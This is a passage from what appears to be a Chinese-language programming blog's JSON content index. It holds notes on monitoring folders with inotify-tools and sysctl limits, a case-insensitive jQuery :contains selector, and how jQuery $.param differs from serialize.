class=\"line\">\t&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"SMSTO\"><a href=\"#SMSTO\" class=\"headerlink\" title=\"SMSTO\"></a>SMSTO</h3><p>這邊有個地雷，SMSTO 小米手機不能轉<br>可以用Google 智慧鏡頭 解決</p>\n<p>QRCODE </p>\n<p>正常手機掃條碼就能自動轉</p>\n<h2 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h2><p><a href=\"https://paper.dropbox.com/doc/vite2-Make-Web-Dev-Fast-Again-Again.-9DcJOLb0spaYNbCbF6Zqd\" target=\"_blank\" rel=\"noopener\">vite2: Make Web Dev Fast Again &amp; Again. – Dropbox Paper</a></p>\n<p><a href=\"https://paper.dropbox.com/doc/ES67891011-oUCvWdcmTSKsiuGzbTjZC\" target=\"_blank\" rel=\"noopener\">ES6,7,8,9,10,11中，用一次就上<a href=\"https://github.com/kurotanshi/hex-vite-demo\" target=\"_blank\" rel=\"noopener\">GitHub - kurotanshi/hex-vite-demo: 2021 大神來六角 demo code</a>癮的語法 – Dropbox Paper</a></p>\n","categories":["JavaScript"],"tags":["javascript","html5","qrcode"]},{"title":"inotify-tools 監聽資料夾裡檔案異動工具","url":"/blog/2020/01/12/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/","content":"<p>最近做到大檔案處理方式<br>由於資料太多，程式在掃整個檔案目錄就花費很多時間<br>在想有什麼工具可以監聽資料夾這個動作<br>後來有找到 inotify-tools 可以做到<br>這邊就小記</p>\n<a id=\"more\"></a>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install inotify-tools</span><br></pre></td></tr></table></figure>\n<h2 id=\"Linux-指令\"><a href=\"#Linux-指令\" class=\"headerlink\" title=\"Linux 指令\"></a>Linux 指令</h2><p>監聽 /home 資料夾目錄(文件的訪問，寫入，修改，刪除)</p>\n<h3 id=\"inotifywait\"><a href=\"#inotifywait\" class=\"headerlink\" title=\"inotifywait\"></a>inotifywait</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">inotifywait -rm /home</span><br></pre></td></tr></table></figure>\n<p>note:<br>-r 遞迴目錄都會接收到監聽<br>-m 收到監聽異動會持續監聽，不會停止</p>\n<p>ls 資料夾也會收到訊息</p>\n<h3 id=\"inotifywatch\"><a href=\"#inotifywatch\" class=\"headerlink\" title=\"inotifywatch\"></a>inotifywatch</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">inotifywatch -v -e access -e modify -t 60 -r /home</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Establishing watches…<br>Setting up watch(es) on /home<br>OK, /home is now being watched.<br>Total of 5 watches.<br>Finished establishing watches, now collecting statistics.<br>Will listen for events for 30 seconds.<br>total  access  modify  filename<br>13     3       10      /home/vagrant/</p>\n</blockquote>\n<p>監聽access（文件讀取)、modify(文件更改)檔案做統計個數</p>\n<p>NOTE:<br>-v 顯示訊息<br>-e 要監聽的事件<br>-t 監聽幾秒鐘<br>-r 遞迴目錄都會接收到監聽</p>\n<h3 id=\"相關指令設定\"><a href=\"#相關指令設定\" class=\"headerlink\" title=\"相關指令設定\"></a>相關指令設定</h3><blockquote>\n<p>inotifywait<br>語法：<br>inotifywait [-hcmrq] [-e ] [-t ] [–format ] [–timefmt ] [ … ]<br>參數：<br>-h,–help<br>輸出幫助信息<br>@<br>排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。<br>–fromfile<br>從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。<br>-m, –monitor<br>接收到一個事情而不退出，無限期地執行。默認的行為是接收到一個事情後立即退出。<br>-d, –daemon<br>跟–monitor一樣，除了是在後台運行，需要指定–outfile把事情輸出到一個文件。也意味著使用了–syslog。<br>-o, –outfile<br>輸出事情到一個文件而不是標準輸出。<br>-s, –syslog<br>輸出錯誤信息到系統日誌<br>-r, –recursive<br>監視一個目錄下的所有子目錄。<br>-q, –quiet<br>指定一次，不會輸出詳細信息，指定二次，除了致命錯誤，不會輸出任何信息。<br>–exclude<br>正則匹配需要排除的文件，大小寫敏感。<br>–excludei<br>正則匹配需要排除的文件，忽略大小寫。<br>-t , –timeout<br>設置超時時間，如果為0，則無限期地執行下去。<br>-e , –event<br>指定監視的事件。<br>-c, –csv<br>輸出csv格式。<br>–timefmt<br>指定時間格式，用於–format選項中的%T格式。<br>–format<br>指定輸出格式。<br>%w 表示發生事件的目錄<br>%f 表示發生事件的文件<br>%e 表示發生的事件<br>%Xe 事件以「X」分隔<br>%T 使用由–timefmt定義的時間格式<br>inotifywatch</p>\n<p>語法：<br>inotifywatch [-hvzrqf] [-e ] [-t ] [-a ] [-d ] [ … ]<br>參數：<br>-h, –help<br>輸出幫助信息<br>-v, –verbose<br>輸出詳細信息<br>@<br>排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。<br>–fromfile<br>從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。<br>-z, –zero<br>輸出表格的行和列，即使元素為空<br>–exclude<br>正則匹配需要排除的文件，大小寫敏感。<br>–excludei<br>正則匹配需要排除的文件，忽略大小寫。<br>-r, –recursive<br>監視一個目錄下的所有子目錄。<br>-t , –timeout<br>設置超時時間<br>-e , –event<br>只監聽指定的事件。<br>-a , –ascending<br>以指定事件升序排列。<br>-d , –descending<br>以指定事件降序排列。</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>access</td>\n<td>文件讀取</td>\n</tr>\n<tr>\n<td>modify</td>\n<td>文件更改。</td>\n</tr>\n<tr>\n<td>attrib</td>\n<td>文件屬性更改，如權限，時間戳等。</td>\n</tr>\n<tr>\n<td>close_write</td>\n<td>以可寫模式打開的文件被關閉，不代表此文件一定已經寫入數據。</td>\n</tr>\n<tr>\n<td>close_nowrite</td>\n<td>以只讀模式打開的文件被關閉。</td>\n</tr>\n<tr>\n<td>close</td>\n<td>文件被關閉，不管它是如何打開的。</td>\n</tr>\n<tr>\n<td>open</td>\n<td>文件打開。</td>\n</tr>\n<tr>\n<td>moved_to</td>\n<td>一個文件或目錄移動到監聽的目錄，即使是在同一目錄內移動，此事件也觸發。</td>\n</tr>\n<tr>\n<td>moved_from</td>\n<td>一個文件或目錄移出監聽的目錄，即使是在同一目錄內移動，此事件也觸發。</td>\n</tr>\n<tr>\n<td>move</td>\n<td>包括moved_to和 moved_from</td>\n</tr>\n<tr>\n<td>move_self</td>\n<td>文件或目錄被移除，之後不再監聽此文件或目錄。</td>\n</tr>\n<tr>\n<td>create</td>\n<td>文件或目錄創建</td>\n</tr>\n<tr>\n<td>delete</td>\n<td>文件或目錄刪除</td>\n</tr>\n<tr>\n<td>delete_self</td>\n<td>文件或目錄移除，之後不再監聽此文件或目錄</td>\n</tr>\n<tr>\n<td>unmount</td>\n<td>文件系統取消掛載，之後不再監聽此文件系統。</td>\n</tr>\n</tbody>\n</table>\n<p>資料來源: <a href=\"https://www.centos.bz/2012/06/inotify-tools-introduction/\" target=\"_blank\" rel=\"noopener\">inotify-tools使用方法介紹-Linux運維日誌</a></p>\n<h2 id=\"相關-inotify-設定\"><a href=\"#相關-inotify-設定\" class=\"headerlink\" title=\"相關 inotify 設定\"></a>相關 inotify 設定</h2><blockquote>\n<p>3、參數說明<br>max_user_instances：每個用戶創建inotify實例最大值<br>max_queued_events：inotify隊列最大長度，如果值太小，會出現錯誤，導致監控文件不準確<br>max_user_watches：要知道同步的文件包含的目錄數，可以用：<br>[root@localhost]# find /home/rain -type d|wc -l 統計，必須保證參數值大於統計結果（/home/tan/uploadFile/為同步文件目錄）。</p>\n</blockquote>\n<p>查看設定</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sysctl -a | grep max_queued_events  </span><br><span class=\"line\"><span class=\"comment\">#fs.inotify.max_queued_events = 16384  </span></span><br><span class=\"line\">sysctl -a | grep max_user_watches  </span><br><span class=\"line\"><span class=\"comment\">#fs.inotify.max_user_watches = 8192  </span></span><br><span class=\"line\"><span class=\"comment\">#fs.epoll.max_user_watches = 798863  </span></span><br><span class=\"line\">sysctl -a | grep max_user_instances  </span><br><span class=\"line\"><span class=\"comment\">#fs.inotify.max_user_instances = 128</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>五、修改inotify參數</p>\n<p>1、命令修改<br>[root@localhost bin]# sysctl -w fs.inotify.max_user_instances=130<br>fs.inotify.max_user_instances = 130</p>\n<p>2、文件修改<br>[root@localhost]# vi /etc/sysctl.conf  </p>\n<p>#添加如下代碼<br>fs.inotify.max_user_instances=130</p>\n</blockquote>\n<p>資料來源: <a href=\"http://www.1felse.com/blog/view.do?blogId=ff8080816102bdbb01610d45232d005a\" target=\"_blank\" rel=\"noopener\">CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記</a></p>\n<h2 id=\"相關串接方法\"><a href=\"#相關串接方法\" class=\"headerlink\" title=\"相關串接方法\"></a>相關串接方法</h2><ul>\n<li><p><a href=\"https://jackyu.cn/tech/rsync-plus-inotify-tools/\" target=\"_blank\" rel=\"noopener\">rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky’s Blog</a><br>監聽實作 rsync 方法</p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/chunyuan314/article/details/81750211\" target=\"_blank\" rel=\"noopener\">PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客</a><br>發現 PHP 有擴充外掛可以使用</p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/spareribs/p/7722453.html\" target=\"_blank\" rel=\"noopener\">inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園</a><br>跟上面 PHP 不太一樣<br>這邊他是用 inotify 寫入 log 方式去做比較是否異動</p>\n</li>\n<li><p><a href=\"https://jusene.github.io/2017/02/18/rsync-inotify/\" target=\"_blank\" rel=\"noopener\">Rsync+Inotify 搭建實時同步數據 ‧ Jusene’s Blog</a></p>\n</li>\n<li><a href=\"https://www.devopssec.cn/2018/08/23/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7-RSYNC%E7%BB%93%E5%90%88INOTIFY-TOOLS%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/\" target=\"_blank\" rel=\"noopener\">數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec</a><br>覺得這兩篇也寫得不錯</li>\n</ul>\n<h2 id=\"小小實驗\"><a href=\"#小小實驗\" class=\"headerlink\" title=\"小小實驗\"></a>小小實驗</h2><p><a href=\"https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/\">cp 複製檔案可能沒注意的事情 | 程式狂想筆記</a><br>實驗一下複製大檔案當下狀況<br>是忽看到 CLOSE_WRITE 做複製動作會比較安全</p>\n<p>看了一下<br>-e close_write,delete,create,attrib<br>-e close_write,delete,moved_to<br>我看其他篇文章有下這個<br>這樣真的用 close_write 比較安全</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">/home/vagrant/vv/ CREATE file.txt</span><br><span class=\"line\">/home/vagrant/vv/ OPEN file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">...</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ MODIFY file.txt</span><br><span class=\"line\">/home/vagrant/vv/ CLOSE_WRITE,CLOSE file.txt</span><br></pre></td></tr></table></figure>\n<h2 id=\"總結\"><a href=\"#總結\" class=\"headerlink\" title=\"總結\"></a>總結</h2><p>我本來想找找網路上有沒有搭配 inotify-tools 做 RabbitMQ 動作<br>是有找到 <a href=\"https://github.com/prashanthpai/sof-object-listing/tree/master/inotify\" target=\"_blank\" rel=\"noopener\">sof-object-listing/inotify at master · prashanthpai/sof-object-listing</a>，但未確認是不是能真的用<br>大多是做 <strong>Web 監聽檔案</strong> 和 <strong>資料同步</strong> 居多<br>但是 inotify-tools 看起來也有接收大量打案也有極限<br>不知道是不是一個好的解決方式<br>也要看其況</p>\n<h2 id=\"相關連結\"><a href=\"#相關連結\" class=\"headerlink\" title=\"相關連結\"></a>相關連結</h2><ul>\n<li><a href=\"https://www.centos.bz/2012/06/inotify-tools-introduction/\" target=\"_blank\" rel=\"noopener\">inotify-tools使用方法介紹-Linux運維日誌</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web1.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"http://www.1felse.com/blog/view.do?blogId=ff8080816102bdbb01610d45232d005a\" target=\"_blank\" rel=\"noopener\">CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web2.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://jackyu.cn/tech/rsync-plus-inotify-tools/\" target=\"_blank\" rel=\"noopener\">rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky’s Blog</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://help.aliyun.com/document_detail/25475.html?spm=5176.2020520101.121.1.211d5c9aAGX8X2#allowHttp\" target=\"_blank\" rel=\"noopener\">安全组应用案例<em>安全组</em>安全_云服务器 ECS-阿里云</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web4.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://blog.csdn.net/chunyuan314/article/details/81750211\" target=\"_blank\" rel=\"noopener\">PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客</a></li>\n<li><a href=\"https://man.linuxde.net/inotifywait\" target=\"_blank\" rel=\"noopener\">inotifywait命令_Linux inotifywait 命令用法詳解：異步文件系統監控機制</a></li>\n<li><a href=\"https://www.cnblogs.com/spareribs/p/7722453.html\" target=\"_blank\" rel=\"noopener\">inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web5.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://jusene.github.io/2017/02/18/rsync-inotify/\" target=\"_blank\" rel=\"noopener\">Rsync+Inotify 搭建實時同步數據 ‧ Jusene’s Blog</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web6.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.devopssec.cn/2018/08/23/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7-RSYNC%E7%BB%93%E5%90%88INOTIFY-TOOLS%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/\" target=\"_blank\" rel=\"noopener\">數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web7.png\" title=\"備份圖\">備份圖</a></li>\n</ul>\n<p><strong>彩蛋</strong><br>突然想到上次研究 Oauth API<br>發現有些token 能做到時效性<br>但一直沒有時間紀錄<br>看到有一篇說 token 時效性問題<br>突然想到這樣不就會買台時間不一樣的問題<br>但後來發現原來 oauth 傳的時間是 duration 時間<br>所以不會有這個問題</p>\n<ul>\n<li><a href=\"https://carsonwah.github.io/http-authentication.html\" target=\"_blank\" rel=\"noopener\">開發者必備知識 - HTTP認證（HTTP Authentication） - Carson’s Tech Note</a></li>\n<li><a href=\"https://github.com/thephpleague/oauth2-server\" target=\"_blank\" rel=\"noopener\">thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server</a></li>\n<li><a href=\"https://yhv5.com/token_1532.html?\" target=\"_blank\" rel=\"noopener\">揭秘Token的工作原理 | Crazy’s Blog</a></li>\n<li><a href=\"https://columns.chicken-house.net/2016/12/01/microservice7-apitoken/\" target=\"_blank\" rel=\"noopener\">微服務架構 #4, 如何強化微服務的安全性? API Token / JWT 的應用 — 安德魯的部落格</a> <a href=\"/blog/2020/01/12/inotify-tools-監聽資料夾裡檔案異動工具/web8.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://juejin.im/post/5a6c60166fb9a01caf37a5e5\" target=\"_blank\" rel=\"noopener\">Token 认证的来龙去脉 - 掘金</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/m/articles/10015681\" target=\"_blank\" rel=\"noopener\">iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://dotblogs.com.tw/litfal/2014/03/08/144298\" target=\"_blank\" rel=\"noopener\">RSA數位簽章的簡單流程 | Litfal的S/L中心 - 點部落</a></li>\n<li><a href=\"https://cola.workxplay.net/encrypt-and-decrypt-data-in-php-using-rsa-example/\" target=\"_blank\" rel=\"noopener\">[PHP] 範例實做 RSA, 公鑰、私鑰非對稱加密、解密演算法 - 串接 iOS,Android - 工作玩樂實驗室</a></li>\n<li><a href=\"https://www.vnewin.com/day18-laravel-passport-oauth2-token/\" target=\"_blank\" rel=\"noopener\">OAuth2 認證機制 Token 原理 - 科技新人</a></li>\n<li><a href=\"https://wumansgy.github.io/2018/11/03/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86RSA%E8%AF%A6%E8%A7%A3/\" target=\"_blank\" rel=\"noopener\">非对称加密RSA详解 | Wuman’s Blog</a></li>\n<li><a href=\"http://www.netadmin.com.tw/netadmin/zh-tw/technology/4596B5843A394A6C88C4C91BC1767667?page=4\" target=\"_blank\" rel=\"noopener\">rsync異地增量備份　資料同步無落差 | 網管人</a></li>\n<li><a href=\"https://gist.github.com/lazyjerry/81c3a9e9ffc01e3a35d0ecd4a6f31e97\" target=\"_blank\" rel=\"noopener\">Script - 使用 inotifywait 監控資料夾並上傳到s3 .sh</a></li>\n<li><a href=\"https://github.com/sysboss/inotify_s3\" target=\"_blank\" rel=\"noopener\">sysboss/inotify_s3: Bash: Inotify files sync to Amazon S3 Cloud</a></li>\n</ul>\n","categories":["實用工具"],"tags":["linux"]},{"title":"jQuery contains 可以抓大小寫的方法","url":"/blog/2020/01/11/jQuery-contains-%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%A4%A7%E5%B0%8F%E5%AF%AB%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>最近做單頁篩選某欄位資料<br>使用 jQuery contains selector 可以簡單實作<br>但發現 contains 沒法搜尋到大小寫不同的單字<br>就爬了一下 Google 紀錄一下</p>\n<a id=\"more\"></a>\n<p>參考如下方法</p>\n<ul>\n<li><a href=\"https://css-tricks.com/snippets/jquery/make-jquery-contains-case-insensitive/\" target=\"_blank\" rel=\"noopener\">Make jQuery :contains Case-Insensitive | CSS-Tricks</a></li>\n<li><a href=\"https://jsfiddle.net/bipen/dyfRa/\" target=\"_blank\" rel=\"noopener\">jquery :contains case-Insensitive - JSFiddle</a></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.extend($.expr[<span class=\"string\">\":\"</span>], &#123;</span><br><span class=\"line\"><span class=\"string\">\"containsIN\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">elem, i, match, array</span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> (elem.textContent || elem.innerText || <span class=\"string\">\"\"</span>).toLowerCase().indexOf((match[<span class=\"number\">3</span>] || <span class=\"string\">\"\"</span>).toLowerCase()) &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>可以用<code>$(&#39;td:containsIN(&quot;&#39;+value+&#39;&quot;)&#39;)</code> 抓到你要的資料<br>非常簡單</p>\n","categories":["JavaScript"],"tags":["jquery"]},{"title":"jQuery $.param傳參數小筆記","url":"/blog/2018/08/17/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/","content":"<p>之前我很常在大學自學 jQuery 很常用<code>$(&#39;xxx&#39;).serialize()</code>做表單傳送動作<br>不過今天上班同事剛好問 form<br>就看到這個<code>$.param(xxxx,true)</code><br>好奇這個跟<code>serialize</code>哪裡不一樣<br>這篇當然要好好補足一下<br>PHP 使用上可能需要用到<code>$.param</code></p>\n<a id=\"more\"></a>\n<p>網路查了一下<br>常看到這三個 method 做比較<code>$.serialize</code>、<code>$.serializeArray</code>和<code>$.param</code></p>\n<h2 id=\"“form”-serialize\"><a href=\"#“form”-serialize\" class=\"headerlink\" title=\"\\$(“form”).serialize()\"></a>\\$(“form”).serialize()</h2><p>基於<code>$.param</code>實作<br>寫\\$.ajax 很常用到這個<br>其實這個跟<code>$.param</code>沒有什麼重要關係</p>\n<h2 id=\"“form”-serializeArray\"><a href=\"#“form”-serializeArray\" class=\"headerlink\" title=\"\\$(“form”).serializeArray\"></a>\\$(“form”).serializeArray</h2><p>產生一個 JavaScript 陣列</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"fieldName\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"value\"</span>: <span class=\"string\">\"value\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"name\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"value\"</span>: <span class=\"string\">\"man\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"sex\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"value\"</span>: <span class=\"string\">\"male\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"class[]\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"value\"</span>: <span class=\"string\">\"math\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"class[]\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"value\"</span>: <span class=\"string\">\"chinese\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>一直覺得這個 method 有什麼軟用，不過我來一直重覆看文件<br>官網有提到</p>\n<blockquote>\n<p>If the object passed is in an Array, it must be an array of objects in the format returned by .serializeArray()<br>[</p>\n<blockquote>\n<p>{ name: “first”, value: “Rick” },<br>{ name: “last”, value: “Astley” },<br>{ name: “job”, value: “Rock Star” }<br>]</p>\n</blockquote>\n</blockquote>\n<p>原來這玩意可以用在這裡(\\$.param)</p>\n<h2 id=\"param\"><a href=\"#param\" class=\"headerlink\" title=\"\\$.param\"></a>\\$.param</h2><p>竟然<code>$().serialize()</code>可以做到我們想要做的事情<br>前面有提到<code>$.param()</code>就是實作出<code>$().serialize()</code></p>\n<p>但我對他第二個參數，比較有興趣<br>在開方者工作測試</p>\n<p>\\$.param 除了可以吃<code>$.serializeArray</code>傳回的陣列以外<br>他還能實接對物件做解析</p>\n<p>比較需要注意的事情是</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> myObject = &#123;</span><br><span class=\"line\">  a: &#123;</span><br><span class=\"line\">    one: <span class=\"number\">1</span>,</span><br><span class=\"line\">    two: <span class=\"number\">2</span>,</span><br><span class=\"line\">    three: <span class=\"number\">3</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  b: [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> recursiveEncoded = $.param(myObject);</span><br><span class=\"line\"><span class=\"keyword\">var</span> recursiveDecoded = <span class=\"built_in\">decodeURIComponent</span>($.param(myObject));</span><br><span class=\"line\"></span><br><span class=\"line\">alert(recursiveEncoded); <span class=\"comment\">// a%5Bone%5D=1&amp;a%5Btwo%5D=2&amp;a%5Bthree%5D=3&amp;b%5B%5D=1&amp;b%5B%5D=2&amp;b%5B%5D=3</span></span><br><span class=\"line\">alert(recursiveDecoded); <span class=\"comment\">// a[one]=1&amp;a[two]=2&amp;a[three]=3&amp;b[]=1&amp;b[]=2&amp;b[]=3</span></span><br></pre></td></tr></table></figure>\n<p>php 程式需要做 form 表單送出的時候，需要用<code>a[one]=1&amp;a[two]=2&amp;a[three]=3&amp;b[]=1&amp;b[]=2&amp;b[]=3</code><br>但這時候 myObject 屬性塞<code>陣列/物件</code>，jQuery 預設會轉<br>\\$.param 接收<code>物件</code>的時候，第二個參數就有差了<br>遇設是 false，所以寫 php 都不用調整這個參數<br>但是 jsp 的就需要了</p>\n<blockquote>\n<p>默認的話，traditional 為 false，即 jquery 會深度序列化參數對象，以適應如 PHP 和 Ruby on Rails 框架<br><a href=\"https://my.oschina.net/i33/blog/119506\" target=\"_blank\" rel=\"noopener\">jQuery ajax 的 traditional 參數的作用 - i33 的個人空間 - 開源中國</a></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.param(myObject, false)</span><br></pre></td></tr></table></figure>\n<p>顯示結果為 <code>a[one]=1&amp;a[two]=2&amp;a[three]=3&amp;b[]=1&amp;b[]=2&amp;b[]=3</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$.param(myObject, true)</span><br></pre></td></tr></table></figure>\n<p>顯示結果為<code>a=[object+Object]&amp;b=1&amp;b=2&amp;b=3</code></p>\n<p><strong>所以不管怎麼用，checkbox name 還是一定要加[]</strong></p>\n<h2 id=\"寫-PHP-checkbox-記得一件事\"><a href=\"#寫-PHP-checkbox-記得一件事\" class=\"headerlink\" title=\"寫 PHP checkbox 記得一件事\"></a>寫 PHP checkbox 記得一件事</h2><p>我覺得我還是一定會忘記 XDD<br>再寫一次</p>\n<p>寫 checkbox 相同 name 的時候，記得在 PHP 變數加個<code>[]</code><br>ex:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xxxx[]\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xxxx[]\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xxxx[]\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xxxx[]\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"jQuery-ajaxSettings-traditional-true\"><a href=\"#jQuery-ajaxSettings-traditional-true\" class=\"headerlink\" title=\"jQuery.ajaxSettings.traditional = true;\"></a>jQuery.ajaxSettings.traditional = true;</h2><p>預設做 ajax 動作實候，呼叫<code>$.param(xxx,true)</code>會自動帶後面的 true<br>但自己寫<code>$.param</code>，還是需要手動加(xxx,true)</p>\n<p>參考來源：<br><a href=\"https://api.jquery.com/jQuery.param/\" target=\"_blank\" rel=\"noopener\">jQuery.param() | jQuery API Documentation</a><br><a href=\"https://www.cnblogs.com/youxin/p/3891140.html\" target=\"_blank\" rel=\"noopener\">jquery serialize()、serializearray()已经\\$.param 方法 - youxin - 博客园</a></p>\n","categories":["jQuery"],"tags":["jQuery","param","form"]},{"title":"jQuery 